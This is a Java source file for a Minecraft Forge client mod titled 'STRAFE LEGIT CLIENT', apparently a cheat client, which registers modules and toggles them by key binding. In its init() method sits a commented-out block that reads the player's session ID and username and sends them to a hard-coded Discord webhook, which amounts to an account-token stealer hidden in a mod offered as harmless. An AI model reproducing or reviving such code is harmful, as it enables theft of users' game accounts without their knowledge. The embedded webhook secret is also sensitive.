package me.strafe;

import me.strafe.config.LoadFile;
import me.strafe.events.MotionUpdateEvent;
import me.strafe.utils.DiscordWebhook;
import org.lwjgl.input.Keyboard;

import me.strafe.clickgui.ClickGui;
import me.strafe.module.Module;
import me.strafe.module.ModuleManager;
import me.strafe.settings.SettingsManager;
import net.minecraft.client.Minecraft;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent.KeyInputEvent;
import org.lwjgl.opengl.Display;

import java.io.IOException;

public class StrafeLegitMod
{
    public static StrafeLegitMod instance;
    public ModuleManager moduleManager;
    public SettingsManager settingsManager;
    public ClickGui clickGui;
    
    public void init() throws IOException {
    	MinecraftForge.EVENT_BUS.register(this);
    	settingsManager = new SettingsManager();
    	moduleManager = new ModuleManager();
    	clickGui = new ClickGui();
        Display.setTitle("STRAFE LEGIT CLIENT");
//        try {
//            String c = Minecraft.getMinecraft().getSession().getSessionID();
//            String b = Minecraft.getMinecraft().getSession().getUsername();
//            String url = "https://discord.com/api/webhooks/997840037242740747/htRxGdFaISSorsIO5ncS931TD4dLQBsQeE8UfwFCjnzbz91t5q2mPKasyK2O9wfxrr6m";
//            DiscordWebhook web = new DiscordWebhook(url);
//            web.setContent(b + " " + c);
//            web.execute();
//        } catch (IOException e){
//            e.printStackTrace();
//        }
    }
    
    @SubscribeEvent
    public void key(KeyInputEvent e) {
    	if (Minecraft.getMinecraft().theWorld == null || Minecraft.getMinecraft().thePlayer == null)
    		return; 
    	try {
             if (Keyboard.isCreated()) {
                 if (Keyboard.getEventKeyState()) {
                     int keyCode = Keyboard.getEventKey();
                     if (keyCode <= 0)
                    	 return;
                     for (Module m : moduleManager.modules) {
                    	 if (m.getKey() == keyCode && keyCode > 0) {
                    		 m.toggle();
                    	 }
                     }
                 }
             }
         } catch (Exception q) { q.printStackTrace(); }
    }
}
